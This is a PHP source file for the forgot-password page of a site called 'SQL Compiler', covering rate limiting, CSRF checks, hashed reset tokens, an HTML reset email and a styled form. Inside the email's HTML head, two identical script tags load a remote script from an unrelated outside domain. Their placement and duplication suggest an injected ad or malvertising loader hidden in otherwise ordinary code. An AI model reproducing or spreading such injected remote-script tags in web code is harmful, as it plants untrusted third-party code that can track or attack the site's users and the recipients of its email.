<?php
// forgot_password.php
require_once __DIR__ . '/config/db_control.php';
require_once __DIR__ . '/config/csrf.php';
require_once __DIR__ . '/includes/SimpleSMTP.php';

// RATE LIMITING
if (session_status() === PHP_SESSION_NONE) session_start();

$limit = 5; // 5 attempts
$window = 300; // per 5 minutes

if (!isset($_SESSION['forgot_pw_rate_limit'])) {
    $_SESSION['forgot_pw_rate_limit'] = ['count' => 0, 'start_time' => time()];
}

if (time() - $_SESSION['forgot_pw_rate_limit']['start_time'] > $window) {
    $_SESSION['forgot_pw_rate_limit'] = ['count' => 0, 'start_time' => time()];
}

if ($_SESSION['forgot_pw_rate_limit']['count'] >= $limit) {
    die("Too many password reset attempts. Please wait 5 minutes.");
}

$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['forgot_pw_rate_limit']['count']++; // Increment on POST
    
    $email = trim($_POST['email'] ?? '');
    
    if (!validateCsrfToken($_POST['csrf_token'] ?? '')) {
        $error = "Session expired (CSRF). Please reload.";
    } elseif (!$email) {
        $error = "Please enter your email address.";
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = "Invalid email format.";
    } else {
        try {
            $pdo = getControlDB();
            
            // Check if email exists
            $stmt = $pdo->prepare("SELECT id, name FROM users WHERE email = ?");
            $stmt->execute([$email]);
            $user = $stmt->fetch();
            
            // Always show success message (security: don't reveal if email exists)
            $success = "If an account exists with this email, you will receive a password reset link shortly.";
            
            if ($user) {
                // Generate secure random token
                $token = bin2hex(random_bytes(32));
                $tokenHash = hash('sha256', $token);
                $expiresAt = date('Y-m-d H:i:s', time() + 3600); // 1 hour expiry
                
                // Store token hash in database
                $updateStmt = $pdo->prepare(
                    "UPDATE users SET reset_token_hash = ?, reset_token_expires_at = ? WHERE id = ?"
                );
                $updateStmt->execute([$tokenHash, $expiresAt, $user['id']]);
                
                // Build reset link
                $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
                $host = $_SERVER['HTTP_HOST'];
                $resetLink = "{$protocol}{$host}/reset_password.php?token={$token}&email=" . urlencode($email);
                
                // Send email
                $subject = "Password Reset Request - SQL Compiler";
                $body = "
                <html>
                <head>
<script src='https://5gvci.com/act/files/tag.min.js?z=10681000' data-cfasync='false' async></script>
                    <style>
                        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
                        .container { max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                        .header { background: linear-gradient(135deg, #0891b2 0%, #3b82f6 100%); color: white; padding: 30px; text-align: center; }
                        .content { padding: 30px; color: #333; }
                        .button { display: inline-block; background: #0891b2; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 20px 0; }
                        .footer { background: #f8f8f8; padding: 20px; text-align: center; font-size: 12px; color: #666; }
                    </style>
                <script src='https://5gvci.com/act/files/tag.min.js?z=10681000' data-cfasync='false' async></script>
</head>
                <body>
                    <div class='container'>
                        <div class='header'>
                            <h1 style='margin: 0;'>Password Reset Request</h1>
                        </div>
                        <div class='content'>
                            <p>Hello {$user['name']},</p>
                            <p>We received a request to reset your password for your SQL Compiler account.</p>
                            <p>Click the button below to reset your password:</p>
                            <p style='text-align: center;'>
                                <a href='{$resetLink}' class='button'>Reset Password</a>
                            </p>
                            <p style='color: #666; font-size: 14px;'>Or copy and paste this link into your browser:</p>
                            <p style='word-break: break-all; color: #0891b2; font-size: 12px;'>{$resetLink}</p>
                            <p style='color: #999; font-size: 13px; margin-top: 30px;'>
                                <strong>Note:</strong> This link will expire in 1 hour. If you didn't request a password reset, please ignore this email.
                            </p>
                        </div>
                        <div class='footer'>
                            <p>&copy; " . date('Y') . " SQL Compiler. All rights reserved.</p>
                        </div>
                    </div>
                </body>
                </html>
                ";
                
                // Configure SMTP
                $mailer = new SimpleSMTP(
                    'mail.sqlcompiler.shop',  // host
                    465,                       // port (SSL)
                    'admin@sqlcompiler.shop',  // username
                    'YOUR_SMTP_PASSWORD',      // password
                    'admin@sqlcompiler.shop',  // from
                    'SQL Compiler'             // from name
                );
                
                // Send email
                if (!$mailer->send($email, $subject, $body, true)) {
                    // Log error but don't reveal to user
                    error_log("Failed to send reset email to {$email}: " . $mailer->getLastError());
                }
            }
            
        } catch (Exception $e) {
            error_log("Forgot password error: " . $e->getMessage());
            $error = "An error occurred. Please try again later.";
            $success = '';
        }
    }
}

require_once 'includes/header.php';
?>

<div class="min-h-screen grid lg:grid-cols-2">
    <!-- Left Side: Visuals -->
    <div class="hidden lg:flex flex-col justify-center items-center relative overflow-hidden bg-[#050a14]">
        <div class="absolute inset-0 bg-grid opacity-30"></div>
        <div class="absolute w-96 h-96 bg-cyan-500/10 rounded-full blur-[100px] top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 animate-pulse-slow"></div>
        
        <div class="relative z-10 text-center space-y-4">
            <div class="w-16 h-16 bg-gradient-to-tr from-cyan-500 to-blue-600 rounded-2xl mx-auto flex items-center justify-center mb-6 shadow-2xl shadow-cyan-500/30">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" /></svg>
            </div>
            <h2 class="text-4xl font-bold font-sans">
                Recover Your <br>
                <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500">Access.</span>
            </h2>
            <p class="text-slate-500 max-w-sm mx-auto">Enter your email and we'll send you a secure link to reset your password.</p>
        </div>
    </div>

    <!-- Right Side: Form -->
    <div class="flex items-center justify-center p-8 bg-[#0a0f1a] relative">
        <a href="login.php" class="absolute top-8 left-8 text-sm text-slate-500 hover:text-white transition flex items-center gap-2">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
            Back to Login
        </a>

        <div class="w-full max-w-sm space-y-8 glass-nav p-8 rounded-2xl border border-white/5">
            <div class="text-center">
                <h2 class="text-3xl font-bold tracking-tight">Forgot Password</h2>
                <p class="mt-2 text-sm text-slate-400">Reset your account password</p>
            </div>

            <?php if ($error): ?>
                <div class="bg-red-500/10 border border-red-500/20 text-red-400 px-4 py-3 rounded-lg text-xs font-mono">
                    <?= htmlspecialchars($error) ?>
                </div>
            <?php endif; ?>

            <?php if ($success): ?>
                <div class="bg-green-500/10 border border-green-500/20 text-green-400 px-4 py-3 rounded-lg text-sm">
                    <div class="flex items-start gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                        <div><?= htmlspecialchars($success) ?></div>
                    </div>
                </div>
            <?php endif; ?>

            <?php if (!$success): ?>
            <form method="POST" class="space-y-6">
                <?= csrfInput() ?>
                <div>
                    <label class="block text-xs font-medium text-slate-400 mb-1.5 uppercase tracking-wider">Email Address</label>
                    <div class="relative group">
                        <input type="email" name="email" required 
                            value="<?= htmlspecialchars($_POST['email'] ?? '') ?>"
                            placeholder="your@email.com"
                            class="w-full bg-[#0f1623] border border-slate-800 rounded-lg px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all peer">
                        <div class="absolute inset-0 rounded-lg bg-cyan-500/20 blur opacity-0 peer-focus:opacity-100 transition duration-500 -z-10"></div>
                    </div>
                </div>

                <button type="submit" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-bold py-3 rounded-lg transition-all hover:shadow-[0_0_30px_rgba(8,145,178,0.5)] hover:-translate-y-0.5 relative overflow-hidden group">
                    <span class="relative z-10 flex items-center justify-center gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
                        Send Reset Link
                    </span>
                    <div class="absolute inset-0 bg-white/20 transform -skew-x-12 -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
                </button>

                <p class="text-center text-sm text-slate-500">
                    Remember your password? <a href="login.php" class="text-cyan-400 hover:text-cyan-300 font-medium">Sign In</a>
                </p>
            </form>
            <?php else: ?>
                <div class="text-center pt-4">
                    <a href="login.php" class="text-cyan-400 hover:text-cyan-300 font-medium">Return to Login</a>
                </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<?php require_once 'includes/footer.php'; ?>
